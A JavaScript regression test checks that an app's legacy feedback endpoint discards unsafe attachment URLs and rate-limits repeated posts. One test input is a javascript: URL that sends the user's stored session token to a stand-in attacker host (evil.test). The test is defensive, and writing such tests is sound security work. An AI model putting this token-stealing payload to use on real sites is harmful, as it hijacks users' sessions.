"use strict";
// Regression (security scan 17 Nov 2026): POST /api/errors/feedback stored category,
// priority, message and attachments unchecked (a javascript: URL became a link in the admin
// feedback view) with no rate limit. It now runs the POST /api/feedback/submit handler:
// only Descall uploads are kept as attachments, and repeated posts are limited.
process.env.NODE_ENV = "test"; process.env.JWT_SECRET = "test-secret-do-not-use-in-prod";
process.env.SUPABASE_URL = "https://placeholder.supabase.co"; process.env.SUPABASE_SERVICE_ROLE_KEY = "placeholder-key";
const assert = require("assert");
const http = require("http");
const express = require("express");
const { createFakeSupabase } = require("./fakeSupabase.cjs");
const fake = createFakeSupabase({ users: [{ id: "u-a", username: "demir", active_sessions: [{ id: "s-a" }] }], user_feedback: [] });
require.cache[require.resolve("../db/supabase")] = { id: "s", filename: "s", loaded: true, exports: fake };
const mailPath = require.resolve("../lib/feedbackEmail");
require.cache[mailPath] = { id: mailPath, filename: mailPath, loaded: true, exports: { sendFeedbackEmail: async () => ({ sent: false }) } };
const quiet = console.log; console.log = () => {};
const { signToken } = require("../config/jwt");
const app = express(); app.use(express.json()); app.use("/api/errors", require("../routes/errors"));
(async () => {
  const srv = http.createServer(app); await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  const tok = signToken({ id: "u-a", username: "demir", sid: "s-a" });
  const post = (body) => fetch("http://127.0.0.1:" + srv.address().port + "/api/errors/feedback", { method: "POST", headers: { "content-type": "application/json", authorization: "Bearer " + tok }, body: JSON.stringify(body) });
  const OWN = "https://placeholder.supabase.co/storage/v1/object/public/media/images/1-a.png";
  const r = await post({ category: "bug", priority: "high", message: "Mikrofon kırmızı kalıyor", attachments: ["javascript:fetch('//evil.test/'+localStorage.descall_token)", "https://evil.test/pixel.gif", OWN] });
  assert.strictEqual(r.status, 200);
  const row = fake._tables.user_feedback.rows[0];
  assert.deepStrictEqual(row.attachments, [OWN], "only the Descall upload is stored");
  let limited = false;
  for (let i = 0; i < 30 && !limited; i += 1) limited = (await post({ category: "bug", priority: "high", message: "tekrar tekrar " + i })).status === 429;
  assert.ok(limited, "repeated legacy submits are rate limited");
  quiet("legacyFeedbackSubmit test ok");
  srv.close();
  process.exit(0);
})().catch((e) => { quiet(e); process.exit(1); });
